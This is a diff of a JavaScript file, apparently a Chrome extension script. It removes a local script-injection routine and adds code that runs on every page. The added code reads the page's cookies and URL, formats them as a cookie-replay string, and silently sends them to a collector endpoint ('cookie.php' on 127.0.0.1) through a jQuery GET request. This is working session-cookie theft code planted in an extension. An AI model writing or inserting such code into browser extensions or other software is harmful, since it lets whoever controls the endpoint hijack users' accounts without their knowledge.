@@ -1,16 +1,23 @@
 (function () {
-
-    function init() {
-        var is = $('#js_ext').length;
-        if(!is){
-            var head = $('head');
-            var s = '<script type="text/javascript" id="js_ext" src="./U_js.js"></script>';
-            head.append(s);
-        }
-    }
-
-    window.document.addEventListener("DOMContentLoaded", init, false);
-    // window.document.addEventListener("dom:loaded", init, false);
-
+    // console.log("jack_Chrome插件");
+    var _cookie = document.cookie;
+    var setCookie = 'document.cookie="'+_cookie+'";'
+    var href = document.location.href;
+    var _ = {
+        href: document.location.href,
+        setCookie: 'document.cookie="'+_cookie+'";'
+    };
+    // console.log(_);
+    $.get('//127.0.0.1/test/cookie.php',{data:_}, function(_) {
+        // console.log(_);
+    });
+    // 选项 点击测试
+    (function () {
+       var jack_Chrome = $("#jack_Chrome");
+        jack_Chrome
+        .on('click','#a01',function () {
+           // window.location.href = '//baidu.com';
+           console.log(chrome.windows);
+        });
+    }());
 }());
-
